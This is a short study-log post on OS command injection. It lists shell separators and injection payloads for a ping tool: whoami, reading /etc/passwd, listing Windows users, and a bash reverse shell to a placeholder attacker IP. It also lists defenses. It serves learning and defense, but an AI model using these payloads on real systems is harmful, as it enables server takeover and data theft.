## 🗓️ Day 38/100 – OS Command Injection

**Focus:** Executing arbitrary system commands via vulnerable web applications.

### 🐚 What is Command Injection?
It allows an attacker to execute operating system (OS) commands on the server running an application, typically fully compromising the application and its data.

### ⚔️ Attack Techniques Practiced

**1. Command Separators**
*   **Linux:** `;`, `|`, `||`, `&&`, `$()`, `` ` ``
*   **Windows:** `&`, `|`, `||`, `&&`

**2. Basic Exploitation**
*   **Scenario:** A ping tool taking IP input.
*   **Payload:** `127.0.0.1; whoami`
*   **Output:**
    ```
    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    root
    ```

**3. Data Exfiltration**
*   **Payload:** `127.0.0.1; cat /etc/passwd` (Read sensitive files)
*   **Payload:** `127.0.0.1; net users` (List Windows users)

**4. Reverse Shell (The Goal)**
*   **Payload:** `127.0.0.1; bash -i >& /dev/tcp/attacker_ip/4444 0>&1`
*   **Result:** Full interactive shell access on the attacker's machine.

### 🛡️ Defense Mechanisms
*   **Avoid Shell Execution:** Use native APIs (e.g., Java's `ProcessBuilder`).
*   **Input Sanitization:** Reject metacharacters like `;`, `&`, `|`.
*   **Parameterized Functions:** Never concatenate user input directly into command strings.

**Day 38 Takeaway:** Command Injection is often simpler than SQLi but far more devastating, offering immediate system-level access.
